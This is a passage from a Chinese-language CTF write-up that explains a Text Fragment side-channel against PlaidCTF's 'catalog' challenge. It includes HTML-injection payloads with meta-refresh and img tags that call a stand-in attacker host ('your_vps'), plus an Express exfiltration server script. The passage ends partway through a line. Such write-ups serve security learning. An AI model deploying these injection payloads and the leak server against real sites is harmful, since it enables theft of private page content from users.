info"><p>Note:</p><blockquote><p>Support the &#x2018;loading&#x2019; attribute, which can be used to defer the load of below-the-fold iframes and images on the page until the user scrolls near them. This is to reduce data usage, memory usage, and to speed up above-the-fold content. Web developers can opt-in to lazy load by specifying loading=lazy on <code>&lt;iframe&gt;</code> and <code>&lt;img&gt;</code> elements.</p></blockquote><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x53EA;&#x6709;&#x5F53;&#x7528;&#x6237;&#x7A97;&#x53E3;&#x9875;&#x9762;&#x5185;&#x5173;&#x6CE8;&#x5230;<code>&lt;img&gt;</code>&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x8BE5;&#x6807;&#x7B7E;&#x624D;&#x80FD;&#x52A0;&#x8F7D;&#x5BF9;&#x5E94;&#x7684;&#x8D44;&#x6E90;&#x3002;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&lt;img&gt;</code>&#x539F;&#x751F;&#x5C5E;&#x6027;<code>loading=lazy</code>&#x6765;&#x5B9E;&#x73B0;&#xFF0C;Chrome 76&#x4EE5;&#x540E;&#x7684;&#x7248;&#x672C;&#x90FD;&#x5DF2;&#x5B9E;&#x73B0;&#x4E86;&#x8BE5;&#x529F;&#x80FD;&#x2014;&#x2014;<a href="https://chromestatus.com/feature/5645767347798016" target="_blank" rel="noopener">Lazily load iframes and images via &#x2018;loading&#x2019; attribute</a></p></blockquote><p>&#x81F3;&#x6B64;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6BD4;&#x8F83;&#x5173;&#x952E;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x90FD;&#x8BF4;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x5B9E;&#x73B0;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x7EC6;&#x8282;&#x7684;&#x5730;&#x65B9;&#x4E86;&#x3002;</p><h3 id="uBlock-amp-User-Activation-amp-Text-Fragments"><a href="#uBlock-amp-User-Activation-amp-Text-Fragments" class="headerlink" title="uBlock &amp; User Activation &amp; Text Fragments"></a>uBlock &amp; User Activation &amp; Text Fragments</h3><p>&#x8FD9;&#x65F6;&#x6211;&#x4EEC;&#x518D;&#x6765;&#x56DE;&#x5934;&#x770B; uBlock &amp; User Activation &#x5728;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x8D77;&#x5230;&#x4E86;&#x4EC0;&#x4E48;&#x4F5C;&#x7528;&#x5462;&#xFF1F;</p><p>&#x56E0;&#x4E3A; Chrome 80 &#x5F15;&#x5165;&#x4E86; Text Fragments &#x7684;&#x673A;&#x5236;&#xFF0C;&#x7EFC;&#x4E0A;&#x6211;&#x4EEC;&#x7684;&#x5206;&#x6790;&#x5229;&#x7528;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x9762;&#xFF0C;&#x7528;&#x8FD9;&#x79CD;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x9690;&#x79C1;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x7136;&#x51FA;&#x4E8E;&#x9690;&#x79C1;&#x8003;&#x8651;&#xFF0C; Google &#x4E5F;&#x5F15;&#x5165;&#x4E86;&#x76F8;&#x5BF9;&#x7684;&#x9650;&#x5236;&#x673A;&#x5236;&#xFF1A;</p><blockquote><p>The following subsections restrict the feature to mitigate the expected attack vectors. In summary, the text fragment directives are invoked only on full (non-same-page) navigations that are the result of a user activation. Additionally, navigations originating from a different origin than the destination will require the navigation to take place in a &#x201C;noopener&#x201D; context, such that the destination page is known to be sufficiently isolated.</p></blockquote><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6CE8;&#x610F;&#x5230;&#x5176;&#x4E2D;&#x975E;&#x5E38;&#x5173;&#x952E;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF1A; <em>*<em>In summary, the text fragment directives are invoked only on full navigations that are the result of a user activation. *</em></em></p><p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4; Text Fragments &#x529F;&#x80FD;&#x4EC5;&#x5728;&#x7531;&#x4E8E; User Activation &#x4EA7;&#x751F;&#x7684;&#x5B8C;&#x6574;&#x5BFC;&#x5411;&#x4E0A;&#x624D;&#x80FD;&#x751F;&#x6548;&#xFF0C;&#x6CA1;&#x6709; User Activation &#x662F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF01;&#x5728;&#x5176;&#x4ED6;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230; Google &#x5BF9;&#x4E8E; *<em>User Activation *</em> &#x505A;&#x4E86;&#x5F88;&#x591A;&#x7684;&#x5F3A;&#x8C03;&#xFF1A;</p><blockquote><p>The examples above illustrate that in specific circumstances, it may be possible for an attacker to extract 1 bit of information about content on the page. However, care must be taken so that such opportunities cannot be exploited to extract arbitrary content from the page by repeating the attack. For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</p></blockquote><p><em><strong>For this reason, restrictions based on user activation and browsing context isolation are very important and must be implemented.</strong></em></p><p>&#x56E0;&#x6B64;&#xFF0C;&#x57FA;&#x4E8E; User Activation &#x548C;&#x6D4F;&#x89C8;&#x4E0A;&#x4E0B;&#x6587;&#x9694;&#x79BB;&#x7684;&#x9650;&#x5236;&#x975E;&#x5E38;&#x91CD;&#x8981;&#xFF0C;&#x5FC5;&#x987B;&#x4E88;&#x4EE5;&#x5B9E;&#x65BD;&#x3002;</p><p>&#x81F3;&#x4E8E; Chrome &#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x9650;&#x5236;&#x8BE5;&#x529F;&#x80FD;&#x7684;&#xFF0C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x6863; <a href="https://wicg.github.io/ScrollToTextFragment/#restricting-the-text-fragment" target="_blank" rel="noopener">Restricting the Text Fragment</a> &#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x4ECE;&#x4EE5;&#x4E0A;&#x6765;&#x770B;&#xFF0C;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x9898;&#x56FE;&#x5C31;&#x5F88;&#x660E;&#x663E;&#x4E86;&#xFF1A;</p><blockquote><p>Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation.</p></blockquote><p>&#x5E76;&#x4E14;&#x6839;&#x636E; <a href="https://docs.google.com/document/d/1erpl1yqJlc1pH0QvVVmi1s3WzqQLsEXTLLh6VuYp228/" target="_blank" rel="noopener">User Activation v2 in Chrome</a> &#xFF1A;</p><blockquote><p>Full-overlay request from subframes: To grant a subframe&#x2019;s full-overlay request (sent through a postMessage), the main frame will check the subframe&#x2019;s HasConsumableUserActivation bit and will consume it. If we expose the frame states through read-only Boolean properties of HTMLIFrameElement (or Document), the main frame can access the info through the postMessage&#x2019;s <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="noopener">event source</a> parameter.</p></blockquote><p>&#x4E24;&#x8005;&#x7ED3;&#x5408;&#x5728;&#x4E00;&#x8D77;&#x53EF;&#x80FD;&#x5C31;&#x6BD4;&#x8F83;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#x4E86;&#xFF0C;<strong>&#x4EE5;&#x4E0B;&#x662F;&#x4E2A;&#x4EBA;&#x6839;&#x636E;&#x6587;&#x6863;&#x7406;&#x89E3;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53C2;&#x8003;&#x7814;&#x7A76;&#x5177;&#x4F53;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5E08;&#x5085;&#x6839;&#x636E;&#x4EE3;&#x7801;&#x7814;&#x7A76;&#x51FA;&#x7ED3;&#x679C;&#x4E0E;&#x6211;&#x7684;&#x7406;&#x89E3;&#x6709;&#x4EC0;&#x4E48;&#x51FA;&#x5165;&#xFF0C;&#x90A3;&#x4E00;&#x5B9A;&#x662F;&#x6211;&#x9519;&#x4E86;</strong>&#xFF1A;</p><p>&#x4E2A;&#x4EBA;&#x7406;&#x89E3;&#xFF1A;&#x7BA1;&#x7406;&#x5458;&#x5355;&#x51FB;&#x4E00;&#x4E2A;&#x6211;&#x4EEC;&#x63D0;&#x4EA4;&#x6253;&#x7684;&#x94FE;&#x63A5;&#xFF0C;&#x5C06;&#x6D88;&#x8017;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x6253;&#x5F00;&#x94FE;&#x63A5;&#xFF0C;&#x800C; uBlock &#x5C06; <code>postMessage</code> &#x53D1;&#x9001;&#x5230;&#x5176;&#x6269;&#x5C55; iframe &#xFF0C;&#x4ECE;&#x800C;&#x590D;&#x5236;&#x7528;&#x6237;&#x6FC0;&#x6D3B;&#x3002; &#x6BCF;&#x5F53;&#x9875;&#x9762;&#x52A0;&#x8F7D;&#x65F6;&#xFF0C;&#x524D;&#x7AEF;&#x90FD;&#x4F1A;&#x4ECE; uBlock &#x6846;&#x67B6;&#x83B7;&#x53D6; postMessage &#xFF0C;&#x4ECE;&#x800C;&#x518D;&#x6B21;&#x5C06;&#x6FC0;&#x6D3B;&#x590D;&#x5236;&#x56DE;&#x53BB;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4ECE; <a href="#Verification">Verification</a> &#x770B;&#x5230;&#x5173;&#x4E8E; uBlock &#x4F20;&#x9012; User Activation &#x7684;&#x9A8C;&#x8BC1;&#x3002;</p><h3 id="Regex"><a href="#Regex" class="headerlink" title="Regex"></a>Regex</h3><p>&#x56E0;&#x4E3A; FLAG &#x6B63;&#x5219;&#x4E3A; <code>/^PCTF\{[A-Z0-9_]+\}$/</code>&#xFF0C;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x7528; Text Fragments &#x53EA;&#x80FD;&#x9A8C;&#x8BC1;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x5982;&#x4E0B; url &#xFF0C;&#x4E00;&#x6B21;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x5B8C;&#x5168;&#x90E8;&#x7684;&#x7B26;&#x5408;&#x6B63;&#x5219;&#x7684;&#x5B57;&#x7B26;&#xFF0C;A-Z0-9_ &#x5916;&#x52A0;&#x4E00;&#x4E2A; } &#x4E3A; FLAG &#x95ED;&#x5408;&#x7684;&#x5B57;&#x7B26;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-J%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-K%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-L%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-M%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">N</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-O%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-P%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Q%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-R%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-S%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-built_in">T</span>%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-U%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-V%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-W%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-X%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Y%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-Z%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-_</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5219;&#x53BB;&#x6389;&#x4E00;&#x534A;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x91C7;&#x7528;&#x4E8C;&#x5206;&#x7684;&#x5F62;&#x5F0F;&#x7F29;&#x5C0F;&#x6211;&#x4EEC;&#x7684;&#x5339;&#x914D;&#x8303;&#x56F4;&#xFF0C;&#x6240;&#x4EE5;&#x4E0B;&#x4E00;&#x6B21;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x7684;&#x662F;</p><p></p><figure class="highlight excel hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht<span class="hljs-symbol">tp:</span>//catalog.pwni.ng/issue.php?id=<span class="hljs-number">3</span>#<span class="hljs-symbol">:</span>~<span class="hljs-symbol">:te</span>xt=<span class="hljs-built_in">T</span>-,F,{,-}%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">0%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">1%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">2%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">3%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">4%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">5%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">6%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">7%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">8%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-<span class="hljs-number">9%</span><span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-A%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-B%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-D%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-E%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-F%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-G%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-H%<span class="hljs-number">26</span><span class="hljs-built_in">text</span>=<span class="hljs-built_in">T</span>-,F,{,-I</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x5339;&#x914D;&#x4E86;&#xFF0C;&#x5C31;&#x7EE7;&#x7EED;&#x5728;&#x8FD9;&#x4E2A;&#x8303;&#x56F4;&#x4E8C;&#x5206;&#xFF0C;&#x4E0D;&#x5339;&#x914D;&#x5C31;&#x7528;&#x53E6;&#x4E00;&#x4E2A;&#x8303;&#x56F4;</p><h3 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h3><p>&#x8FD9;&#x4E2A;&#x90E8;&#x5206;&#x5C31;&#x53EA;&#x662F;&#x63D0;&#x4F9B;&#x590D;&#x73B0;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x4E0B;&#x4E2A;&#x90E8;&#x5206;&#x63D0;&#x4F9B;&#x8BE6;&#x7EC6;&#x7684;&#x653B;&#x51FB;&#x94FE;&#x89E3;&#x91CA;&#xFF1A;</p><ol><li><p>&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_1 &#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_1&amp;title=3&amp;content=1&amp;image=z&quot;/&gt;&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://your_vps/fragment&quot;</span>&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span>+content=&quot;0;URL=&apos;http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%<span class="hljs-attribute">26text</span>=T-,F,{,-0%<span class="hljs-attribute">26text</span>=T-,F,{,-1%<span class="hljs-attribute">26text</span>=T-,F,{,-2%<span class="hljs-attribute">26text</span>=T-,F,{,-3%<span class="hljs-attribute">26text</span>=T-,F,{,-4%<span class="hljs-attribute">26text</span>=T-,F,{,-5%<span class="hljs-attribute">26text</span>=T-,F,{,-6%<span class="hljs-attribute">26text</span>=T-,F,{,-7%<span class="hljs-attribute">26text</span>=T-,F,{,-8%<span class="hljs-attribute">26text</span>=T-,F,{,-9%<span class="hljs-attribute">26text</span>=T-,F,{,-A%<span class="hljs-attribute">26text</span>=T-,F,{,-B%<span class="hljs-attribute">26text</span>=T-,F,{,-D%<span class="hljs-attribute">26text</span>=T-,F,{,-E%<span class="hljs-attribute">26text</span>=T-,F,{,-F%<span class="hljs-attribute">26text</span>=T-,F,{,-G%<span class="hljs-attribute">26text</span>=T-,F,{,-H%<span class="hljs-attribute">26text</span>=T-,F,{,-I%<span class="hljs-attribute">26text</span>=T-,F,{,-J%<span class="hljs-attribute">26text</span>=T-,F,{,-K%<span class="hljs-attribute">26text</span>=T-,F,{,-L%<span class="hljs-attribute">26text</span>=T-,F,{,-M%<span class="hljs-attribute">26text</span>=T-,F,{,-N%<span class="hljs-attribute">26text</span>=T-,F,{,-O%<span class="hljs-attribute">26text</span>=T-,F,{,-P%<span class="hljs-attribute">26text</span>=T-,F,{,-Q%<span class="hljs-attribute">26text</span>=T-,F,{,-R%<span class="hljs-attribute">26text</span>=T-,F,{,-S%<span class="hljs-attribute">26text</span>=T-,F,{,-T%<span class="hljs-attribute">26text</span>=T-,F,{,-U%<span class="hljs-attribute">26text</span>=T-,F,{,-V%<span class="hljs-attribute">26text</span>=T-,F,{,-W%<span class="hljs-attribute">26text</span>=T-,F,{,-X%<span class="hljs-attribute">26text</span>=T-,F,{,-Y%<span class="hljs-attribute">26text</span>=T-,F,{,-Z%<span class="hljs-attribute">26text</span>=T-,F,{,-_<span class="hljs-string">&apos;&quot;&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C; &#x5E76;&#x8BB0;&#x5F55;&#x8BE5; issue &#x7684;&#x6570;&#x5B57; id&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FA8;&#x8BC6;&#xFF0C;&#x8BE5;&#x6570;&#x5B57; id &#x6211;&#x4EEC;&#x79F0;&#x4E3A; issue_id_2&#xFF0C;post http &#x5305;&#x7684; body &#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">id</span>=issue_id_2&amp;title=3&amp;content=1&amp;image=&quot;&gt;&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0;URL=&apos;http://your_vps/&apos;&quot;</span>&gt;&quot;</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>&#x81EA;&#x5DF1;&#x7684; vps &#x4E0A;&#x7528; node &#x8FD0;&#x884C;&#x5982;&#x4E0B; exp.js</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> status = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> unlock = <span class="hljs-literal">false</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> match = <span class="hljs-literal">false</span>;</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/status&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    res.send(<span class="hljs-string">`<span class="hljs-subst">${status}</span>`</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/unlock&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    unlock = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;unlock&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/firstload&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin opened challenge&apos;s page&quot;</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;firstload&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was redirected to attacker&apos;s page&quot;</span>);</span><br><span class="line">    res.sendFile(<span class="hljs-string">&quot;index.html&quot;</span>, {</span><br><span class="line">        root: __dirname</span><br><span class="line">    });</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/injection&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; HTML injection was inserted into id=3 catalog&quot;</span>);</span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">if</span> (match) <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There was a match&quot;</span>);</span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; There wasn&apos;t a match&quot;</span>);</span><br><span class="line">        match = <span class="hljs-literal">false</span>;</span><br><span class="line">        unlock = <span class="hljs-literal">false</span>;</span><br><span class="line">        status = <span class="hljs-literal">false</span>;</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">    res.send(<span class="hljs-string">&quot;injection&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">&quot;/fragment&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    status = <span class="hljs-literal">true</span>;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;==&gt; Admin was fragmented&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> timer = setInterval(<span class="hljs-keyword">async</span> () =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (unlock) {</span><br><span class="line">            res.send(<span class="hljs-string">&quot;fragment&quot;</span>);</span><br><span class="line">            clearInterval(timer);</span><br><span class="line">        }</span><br><span class="line">    }, <span class="hljs-number">1</span>);</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(port);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Server running on port: &quot;</span> + 